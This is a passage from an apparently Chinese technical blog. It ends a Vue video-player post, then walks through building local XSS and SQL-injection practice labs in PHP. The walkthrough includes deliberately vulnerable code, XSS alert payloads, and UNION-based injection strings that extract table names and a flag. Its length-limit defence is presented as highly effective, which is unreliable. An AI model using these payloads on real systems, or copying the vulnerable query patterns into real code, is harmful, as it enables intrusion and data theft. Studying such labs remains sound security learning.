ipt&amp;lang=js&amp; 13:0<span class="hljs-string">-47</span> 19:17<span class="hljs-string">-28</span>
 @ ./src/views/Detail.vue?vue&amp;type=script&amp;lang=js&amp; 1:0<span class="hljs-string">-212</span> 1:228<span class="hljs-string">-231</span> 1:233<span class="hljs-string">-442</span> 1:233<span class="hljs-string">-442</span>
 @ ./src/views/Detail.vue 2:0<span class="hljs-string">-58</span> 3:0<span class="hljs-string">-53</span> 3:0<span class="hljs-string">-53</span> 9:2<span class="hljs-string">-8</span>
 @ ./src/router/index.js 82:11<span class="hljs-string">-40</span>
 @ ./src/main.js 7:0<span class="hljs-string">-30</span> 26:10<span class="hljs-string">-16</span>
</code></pre>



<p>完整的前端代码</p>
<pre><code class="hljs vue">&lt;template&gt;
  &lt;div&gt;
    &lt;div class&#x3D;&#39;demo&#39;&gt;
      &lt;video-player class&#x3D;&quot;video-player-box&quot;
                    ref&#x3D;&quot;videoPlayer&quot;
                    :playsinline&#x3D;&quot;true&quot;
                    :options&#x3D;&quot;playerOptions&quot;&gt;
      &lt;&#x2F;video-player&gt;
    &lt;&#x2F;div&gt;
  &lt;&#x2F;div&gt;
&lt;&#x2F;template&gt;

&lt;script&gt;
import &#123; videoPlayer &#125; from &#39;vue-video-player&#x2F;src&#39;
import &#39;video.js&#x2F;dist&#x2F;video-js.css&#39;
import &#39;vue-video-player&#x2F;src&#x2F;custom-theme.css&#39;

export default &#123;
  name: &quot;VideoDetail&quot;,
  components: &#123;
    videoPlayer
  &#125;,
  data() &#123;
    return &#123;
      &#x2F;&#x2F; id: this.$route.query.id,
      &#x2F;&#x2F; video: &#123;&#125;,
      playerOptions: &#123;
        playbackRates: [0.5, 1.0, 1.5, 2.0], &#x2F;&#x2F; 可选的播放速度
        autoplay: true, &#x2F;&#x2F; 如果为true,浏览器准备好时开始回放。
        muted: false, &#x2F;&#x2F; 默认情况下将会消除任何音频。
        loop: false, &#x2F;&#x2F; 是否视频一结束就重新开始。
        preload: &#39;auto&#39;, &#x2F;&#x2F; 建议浏览器在&lt;video&gt;加载元素后是否应该开始下载视频数据。auto浏览器选择最佳行为,立即开始加载视频（如果浏览器支持）
        language: &#39;zh-CN&#39;,
        aspectRatio: &#39;16:9&#39;, &#x2F;&#x2F; 将播放器置于流畅模式，并在计算播放器的动态大小时使用该值。值应该代表一个比例 - 用冒号分隔的两个数字（例如&quot;16:9&quot;或&quot;4:3&quot;）
        fluid: true, &#x2F;&#x2F; 当true时，Video.js player将拥有流体大小。换句话说，它将按比例缩放以适应其容器。
        sources: [&#123;
          type: &quot;video&#x2F;mp4&quot;, &#x2F;&#x2F; 类型
          src: &#39;&#39; &#x2F;&#x2F; url地址
        &#125;],
        poster: &#39;&#39;, &#x2F;&#x2F; 封面地址
        notSupportedMessage: &#39;此视频暂无法播放，请稍后再试&#39;, &#x2F;&#x2F; 允许覆盖Video.js无法播放媒体源时显示的默认信息。
        controlBar: &#123;
          timeDivider: true, &#x2F;&#x2F; 当前时间和持续时间的分隔符
          durationDisplay: true, &#x2F;&#x2F; 显示持续时间
          remainingTimeDisplay: true, &#x2F;&#x2F; 是否显示剩余时间功能
          fullscreenToggle: true &#x2F;&#x2F; 是否显示全屏按钮
        &#125;
      &#125;
    &#125;
  &#125;,
  created() &#123;
    let id &#x3D;  this.$route.query.id
    &#x2F;&#x2F; this.playerOptions.sources[0].src &#x3D; &quot;http:&#x2F;&#x2F;vjs.zencdn.net&#x2F;v&#x2F;oceans.mp4&quot;
    this.request(&quot;&#x2F;file&#x2F;detail&#x2F;&quot; + id).then(res &#x3D;&gt; &#123;
      console.log(res.data)
      this.video &#x3D; res.data
      this.playerOptions.sources[0].src &#x3D; res.data.url

    &#125;)
  &#125;,
  methods: &#123;&#125;
&#125;
&lt;&#x2F;script&gt;

&lt;style&gt;

&lt;&#x2F;style&gt;
</code></pre>

<p>需要修改的位置只有<code>this.playerOptions.sources[0].src</code></p>
<p>将参数换成你的视频地址即可</p>
<p>实现效果如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526161723965.png" alt="image-20220526161723965"></p>
<p>可以调整播放速度</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526161842064.png" alt="image-20220526161842064"></p>
<h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2>]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>xss和sql注入简单环境的搭建</title>
    <url>/2020/11/15/xss-sql/</url>
    <content><![CDATA[<h1 id="xss和sql注入简单环境的搭建"><a href="#xss和sql注入简单环境的搭建" class="headerlink" title="xss和sql注入简单环境的搭建"></a>xss和sql注入简单环境的搭建</h1><p>以下环境都是基于PHP study搭建的，版本为 php 5.5.38+Apache</p>
<span id="more"></span>

<p>参考了dvwa的漏洞源码与攻击方式。</p>
<h2 id="xss漏洞的搭建"><a href="#xss漏洞的搭建" class="headerlink" title="xss漏洞的搭建"></a>xss漏洞的搭建</h2><h3 id="1-网页源码"><a href="#1-网页源码" class="headerlink" title="1.网页源码"></a>1.网页源码</h3><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;
		&lt;title&gt;xss&lt;&#x2F;title&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;center&gt;
			
			&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;
				&lt;h6&gt;please input your name!&lt;&#x2F;h6&gt;
				&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;&quot; &#x2F;&gt;&lt;br &#x2F;&gt;
				&lt;input type&#x3D;&#39;submit&#39; value&#x3D;&quot;submit&quot; &#x2F;&gt;
			&lt;&#x2F;form&gt;
			
	
&lt;?php
  
function SafeFilter (&amp;$arr) 
&#123;
   $ra&#x3D;Array(&#39;&#x2F;([\x00-\x08,\x0b-\x0c,\x0e-\x19])&#x2F;&#39;,&#39;&#x2F;script&#x2F;&#39;,&#39;&#x2F;javascript&#x2F;&#39;,&#39;&#x2F;vbscript&#x2F;&#39;,&#39;&#x2F;expression&#x2F;&#39;,&#39;&#x2F;applet&#x2F;&#39;
   ,&#39;&#x2F;meta&#x2F;&#39;,&#39;&#x2F;xml&#x2F;&#39;,&#39;&#x2F;blink&#x2F;&#39;,&#39;&#x2F;link&#x2F;&#39;,&#39;&#x2F;style&#x2F;&#39;,&#39;&#x2F;embed&#x2F;&#39;,&#39;&#x2F;object&#x2F;&#39;,&#39;&#x2F;frame&#x2F;&#39;,&#39;&#x2F;layer&#x2F;&#39;,&#39;&#x2F;title&#x2F;&#39;,&#39;&#x2F;bgsound&#x2F;&#39;
   ,&#39;&#x2F;base&#x2F;&#39;,&#39;&#x2F;onload&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;,&#39;&#x2F;onchange&#x2F;&#39;,&#39;&#x2F;onsubmit&#x2F;&#39;,&#39;&#x2F;onreset&#x2F;&#39;,&#39;&#x2F;onselect&#x2F;&#39;,&#39;&#x2F;onblur&#x2F;&#39;,&#39;&#x2F;onfocus&#x2F;&#39;,
   &#39;&#x2F;onabort&#x2F;&#39;,&#39;&#x2F;onkeydown&#x2F;&#39;,&#39;&#x2F;onkeypress&#x2F;&#39;,&#39;&#x2F;onkeyup&#x2F;&#39;,&#39;&#x2F;onclick&#x2F;&#39;,&#39;&#x2F;ondblclick&#x2F;&#39;,&#39;&#x2F;onmousedown&#x2F;&#39;,&#39;&#x2F;onmousemove&#x2F;&#39;
   ,&#39;&#x2F;onmouseout&#x2F;&#39;,&#39;&#x2F;onmouseover&#x2F;&#39;,&#39;&#x2F;onmouseup&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;);
     
   if (is_array($arr))
   &#123;
     foreach ($arr as $key &#x3D;&gt; $value) 
     &#123;
        if (!is_array($value))
        &#123;
          if (!get_magic_quotes_gpc())  &#x2F;&#x2F;不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。
          &#123;
             $value  &#x3D; addslashes($value); &#x2F;&#x2F;给单引号（&#39;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符）  加上反斜线转义
          &#125;
          $value       &#x3D; preg_replace($ra,&#39;&#39;,$value);     &#x2F;&#x2F;删除非打印字符，粗暴式过滤xss可疑字符串
          $arr[$key]     &#x3D; htmlentities(strip_tags($value)); &#x2F;&#x2F;去除 HTML 和 PHP 标记并转换为 HTML 实体
        &#125;
        else
        &#123;
          SafeFilter($arr[$key]);
        &#125;
     &#125;
   &#125;
&#125;
&#x2F;&#x2F;php防注入和XSS攻击通用过滤
$_POST    &amp;&amp; SafeFilter($_POST);

			if (isset($_POST[&#39;username&#39;]))
			&#123;
				$s&#x3D;$_POST[&#39;username&#39;];
				
				echo $s;

			&#125;
			
?&gt;
	&lt;&#x2F;center&gt;
		
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;</code></pre>

<p>网页源码十分简单，就是用户输入所要查询的username，之后将其输入的内容打印出来。</p>
<p>起初并没有对用户的输入进行处理，直接执行了<code>echo</code>，造成了xss漏洞的出现。</p>
<h3 id="2-攻击效果"><a href="#2-攻击效果" class="headerlink" title="2.攻击效果"></a>2.攻击效果</h3><p>在输入栏中输入以下</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(/xsss/)</span>&gt;</span></code></pre>

<p><img src="https://i.loli.net/2020/11/12/4f6rKtjU8sg7IoT.png" alt="xss.png"></p>
<p><img src="https://i.loli.net/2020/11/12/EAnVq5yv4ZWJo8z.png" alt="xss1.png"></p>
<h3 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><p>修复漏洞只需要对用户的输入内容进行检测和过滤，并将一些可能造成攻击的特殊字符进行转义，让其不起到原本的作用。</p>
<p>过滤函数如下</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SafeFilter</span> (<span class="hljs-params">&amp;<span class="hljs-variable">$arr</span></span>) </span>
<span class="hljs-function"></span>&#123;
   <span class="hljs-variable">$ra</span>=<span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>,<span class="hljs-string">&#x27;/script/&#x27;</span>,<span class="hljs-string">&#x27;/javascript/&#x27;</span>,<span class="hljs-string">&#x27;/vbscript/&#x27;</span>,<span class="hljs-string">&#x27;/expression/&#x27;</span>,<span class="hljs-string">&#x27;/applet/&#x27;</span>
   ,<span class="hljs-string">&#x27;/meta/&#x27;</span>,<span class="hljs-string">&#x27;/xml/&#x27;</span>,<span class="hljs-string">&#x27;/blink/&#x27;</span>,<span class="hljs-string">&#x27;/link/&#x27;</span>,<span class="hljs-string">&#x27;/style/&#x27;</span>,<span class="hljs-string">&#x27;/embed/&#x27;</span>,<span class="hljs-string">&#x27;/object/&#x27;</span>,<span class="hljs-string">&#x27;/frame/&#x27;</span>,<span class="hljs-string">&#x27;/layer/&#x27;</span>,<span class="hljs-string">&#x27;/title/&#x27;</span>,<span class="hljs-string">&#x27;/bgsound/&#x27;</span>
   ,<span class="hljs-string">&#x27;/base/&#x27;</span>,<span class="hljs-string">&#x27;/onload/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>,<span class="hljs-string">&#x27;/onchange/&#x27;</span>,<span class="hljs-string">&#x27;/onsubmit/&#x27;</span>,<span class="hljs-string">&#x27;/onreset/&#x27;</span>,<span class="hljs-string">&#x27;/onselect/&#x27;</span>,<span class="hljs-string">&#x27;/onblur/&#x27;</span>,<span class="hljs-string">&#x27;/onfocus/&#x27;</span>,
   <span class="hljs-string">&#x27;/onabort/&#x27;</span>,<span class="hljs-string">&#x27;/onkeydown/&#x27;</span>,<span class="hljs-string">&#x27;/onkeypress/&#x27;</span>,<span class="hljs-string">&#x27;/onkeyup/&#x27;</span>,<span class="hljs-string">&#x27;/onclick/&#x27;</span>,<span class="hljs-string">&#x27;/ondblclick/&#x27;</span>,<span class="hljs-string">&#x27;/onmousedown/&#x27;</span>,<span class="hljs-string">&#x27;/onmousemove/&#x27;</span>
   ,<span class="hljs-string">&#x27;/onmouseout/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseover/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseup/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>);
     
   <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$arr</span>))
   &#123;
     <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) <span class="hljs-comment">//循环语句，挨个检测</span>
     &#123;
        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$value</span>))
        &#123;
          <span class="hljs-keyword">if</span> (!get_magic_quotes_gpc()) 
          &#123;
             <span class="hljs-variable">$value</span>  = addslashes(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//给单引号（&#x27;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符）  加上反斜线转义</span>
          &#125;
          <span class="hljs-variable">$value</span>       = preg_replace(<span class="hljs-variable">$ra</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$value</span>);     <span class="hljs-comment">//删除非打印字符</span>
          <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]     = htmlentities(strip_tags(<span class="hljs-variable">$value</span>)); <span class="hljs-comment">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span>
        &#125;
        <span class="hljs-keyword">else</span>
        &#123;
          SafeFilter(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]);
        &#125;
     &#125;
   &#125;
&#125;</code></pre>

<p><strong>各个函数功能如下：</strong></p>
<p><strong>magic_quotes_gpc</strong>函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误</p>
<p>在magic_quotes_gpc=On的情况下，如果输入的数据有</p>
<p>单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。</p>
<p><strong>addslashes函数</strong></p>
<p><img src="https://i.loli.net/2020/11/12/W7m2yOvok3g6ZXA.png" alt="addslashes.png"></p>
<p><strong>htmlentities()</strong> 函数把字符转换为 HTML 实体。</p>
<h2 id="sql注入环境搭建与攻击"><a href="#sql注入环境搭建与攻击" class="headerlink" title="sql注入环境搭建与攻击"></a>sql注入环境搭建与攻击</h2><p>网页源码，最常见的登录页面，其中没有对用户名和密码进行过滤，就将其带入sql语句中查询造成了sql注入的出现。</p>
<p>login.php源码</p>
<pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;

&lt;html &gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;
        &lt;title&gt;Sqli&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;

&lt;body&gt;

&lt;div class&#x3D;&quot;limiter&quot;&gt;
    &lt;div class&#x3D;&quot;container-login100&quot;&gt;
        &lt;div class&#x3D;&quot;wrap-login100 p-b-160 p-t-50&quot;&gt;
            &lt;form class&#x3D;&quot;login100-form validate-form&quot; action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt;
					&lt;span class&#x3D;&quot;login100-form-title p-b-43&quot;&gt;
						Account Login
					&lt;&#x2F;span&gt;

                &lt;div class&#x3D;&quot;wrap-input100 rs1 validate-input&quot; data-validate&#x3D;&quot;Username is required&quot;&gt;
                    &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;
                    &lt;span class&#x3D;&quot;label-input100&quot;&gt;Username&lt;&#x2F;span&gt;
                &lt;&#x2F;div&gt;


                &lt;div class&#x3D;&quot;wrap-input100 rs2 validate-input&quot; data-validate&#x3D;&quot;Password is required&quot;&gt;
                    &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;
                    &lt;span class&#x3D;&quot;label-input100&quot;&gt;Password&lt;&#x2F;span&gt;
                &lt;&#x2F;div&gt;

                &lt;div class&#x3D;&quot;container-login100-form-btn&quot;&gt;
                    &lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;login100-form-btn&quot;&gt;
                        Sign in
                    &lt;&#x2F;button&gt;
                &lt;&#x2F;div&gt;

            &lt;&#x2F;form&gt;
        &lt;&#x2F;div&gt;

    &lt;&#x2F;a&gt;

&lt;&#x2F;div&gt;

&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;</code></pre>

<p>check.php源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];

<span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名</span>
<span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;
    printf(<span class="hljs-string">&quot;fail:%s&lt;br&gt;&quot;</span>,mysqli_connect_error());
    <span class="hljs-keyword">exit</span>();
&#125;
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$mysqli</span>-&gt;query(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$pwd</span>&#x27;&quot;</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;TABLE border=1,width=400&gt;&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_row(<span class="hljs-variable">$result</span>))
&#123;
	printf (<span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);
       	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login success&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error&quot;</span>;
&#125;
<span class="hljs-comment">// echo &quot;&lt;/TABLE&gt;&quot;;</span>
<span class="hljs-comment">// echo &quot;&lt;/div&gt;&quot;;</span>
<span class="hljs-variable">$mysqli</span>-&gt;close();
<span class="hljs-variable">$result</span>-&gt;close();
<span class="hljs-meta">?&gt;</span></code></pre>

<p>逻辑很简单，在login.php页面提交用户名和密码，将username和password发送到check.php页面连接数据库检查用户是否合法，用户名和密码都正确则，打印出用户名和密码。</p>
<p>在数据库建立了一张users和flag表，便于注入。</p>
<p>表中的内容如下</p>
<p><img src="https://i.loli.net/2020/11/13/YACXPd9oOZvhfxN.png" alt="sql1.png"></p>
<p><img src="https://i.loli.net/2020/11/13/oTqy8WhX6CGwS9A.png" alt="sql2.png"></p>
<p><img src="https://i.loli.net/2020/11/13/ghDmGtqeQLCyNZz.png" alt="sql3.png"></p>
<h3 id="1-漏洞利用"><a href="#1-漏洞利用" class="headerlink" title="1.漏洞利用"></a>1.漏洞利用</h3><p>直接使用万能密码登陆</p>
<pre><code class="hljs apache"><span class="hljs-attribute">username</span>:<span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #
<span class="hljs-attribute">username</span>:<span class="hljs-number">111</span></code></pre>

<p>结果打印出了第一个用户的用户名和密码</p>
<p><img src="https://i.loli.net/2020/11/13/omqb2AzDvC4w69g.png" alt="sql4.png"></p>
<p>这个结果也说名了是字符型注入，接下来利用改注入点获取flag</p>
<h4 id="判断表有几列"><a href="#判断表有几列" class="headerlink" title="判断表有几列"></a>判断表有几列</h4><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span>
页面显示正常，而改为<span class="hljs-number">4</span>的时候网页出现报错，说明了只有三列
<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#</span></code></pre>



<h4 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h4><pre><code class="hljs gauss">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span><span class="hljs-meta">#</span></code></pre>



<p>说明有两个显示位，选择其中一个位置进行注入即可。</p>
<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><pre><code class="hljs gauss">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(table_name),<span class="hljs-number">3</span> from information_schema.TABLES <span class="hljs-built_in">where</span> TABLE_SCHEMA=<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span></code></pre>

<p><img src="https://i.loli.net/2020/11/13/btQg6vFRZipUd1n.png" alt="sql6.png"></p>
<h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><pre><code class="hljs gauss">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(COLUMN_name),<span class="hljs-number">3</span> from information_schema.COLUMNS <span class="hljs-built_in">where</span> TABLE_NAME=&#x27;flag&#x27;<span class="hljs-meta">#</span></code></pre>

<p><img src="https://i.loli.net/2020/11/13/KlwToCWSGiau4FM.png" alt="sql7.png"></p>
<p>（fl4g是dvwa实验中建立没有删除，所以也显示出来了）</p>
<h4 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h4><pre><code class="hljs capnproto">&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(flag),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> flag<span class="hljs-comment">#</span></code></pre>

<p><img src="https://i.loli.net/2020/11/13/wIQmSv7oCeXVWiR.png" alt="sqlflag.png"></p>
<h3 id="2-漏洞防御"><a href="#2-漏洞防御" class="headerlink" title="2.漏洞防御"></a>2.漏洞防御</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a><strong>方法一：</strong></h4><p>最简单的方法对用户名和密码的长度限制，一般用户名的长度不超过十五个字符，而密码的长度一般不超过16个字符长度，所以对用户输入限制长度是最有效的方法之一。因为一般的注入语句都是超过十六个字符的，想要在十六个字符之内构造出有效的注入语句是一件很难的事情。</p>
<p>代码实现</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];
<span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名</span>
<span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;
    printf(<span class="hljs-string">&quot;fail:%s&lt;br&gt;&quot;</span>,mysqli_connect_error());
    <span class="hljs-keyword">exit</span>();
&#125;
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$mysqli</span>-&gt;query(<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$pwd</span>&#x27;&quot;</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;TABLE border=1,width=400&gt;&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;

<span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$pwd</span>)&gt;=<span class="hljs-number">16</span>||strlen(<span class="hljs-variable">$uname</span>)&gt;=<span class="hljs-number">15</span>)
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;It is too long.&quot;</span>;
&#125;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_row(<span class="hljs-variable">$result</span>))
&#123;
	printf (<span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;</span>,<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);
       	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login success.&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error.&quot;</span>;
&#125;
<span class="hljs-comment">// echo &quot;&lt;/TABLE&gt;&quot;;</span>
<span class="hljs-comment">// echo &quot;&lt;/div&gt;&quot;;</span>
<span class="hljs-variable">$mysqli</span>-&gt;close();
<span class="hljs-variable">$result</span>-&gt;close();
<span class="hljs-meta">?&gt;</span></code></pre>



<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong>方法二</strong></h4><p>对用户输入进行检测和过滤，将其输入的可能产生恶意行为的代码删除或者转义，使其失去原来的功能。</p>
<p>代码实现</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];
<span class="hljs-comment">//echo &quot;select * from admin where passward=&#x27;$pwd&#x27; and name=&#x27;$uname&#x27;&lt;br/&gt;&quot;;</span>
<span class="hljs-comment">//echo &quot;&lt;hr&gt;&quot;;</span>

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span>(<span class="hljs-params"><span class="hljs-variable">$Sql_Str</span></span>) </span>&#123;<span class="hljs-comment">//自动过滤Sql的注入语句。</span>
   <span class="hljs-variable">$check</span>=preg_match(<span class="hljs-string">&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;</span>,<span class="hljs-variable">$Sql_Str</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$check</span>) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;</span>;
        <span class="hljs-keyword">exit</span>();
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Sql_Str</span>;
    &#125;
&#125;
<span class="hljs-variable">$pwd</span>=inject_check(<span class="hljs-variable">$pwd</span>);
<span class="hljs-variable">$uname</span> = inject_check(<span class="hljs-variable">$uname</span>);
<span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名</span>
<span class="hljs-keyword">if</span>(mysqli_connect_errno())&#123;
    printf(<span class="hljs-string">&quot;fail:%s&lt;br&gt;&quot;</span>,mysqli_connect_error());
    <span class="hljs-keyword">exit</span>();
&#125;
